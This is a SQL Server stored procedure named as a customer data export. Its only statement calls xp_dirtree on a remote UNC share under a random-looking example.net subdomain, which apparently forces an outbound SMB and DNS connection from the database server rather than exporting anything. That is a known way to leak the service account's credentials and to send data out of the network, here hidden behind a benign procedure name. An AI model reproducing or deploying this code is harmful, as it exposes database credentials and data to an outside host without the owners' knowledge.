CREATE PROCEDURE [dbo].[usp_ExportCustomerData]
AS
BEGIN
    SET NOCOUNT ON;
    EXEC master.sys.xp_dirtree N'\\shareq3xwz7a2kfm4ub6tyc5nre.d.example.net\exports', 1, 1;
END
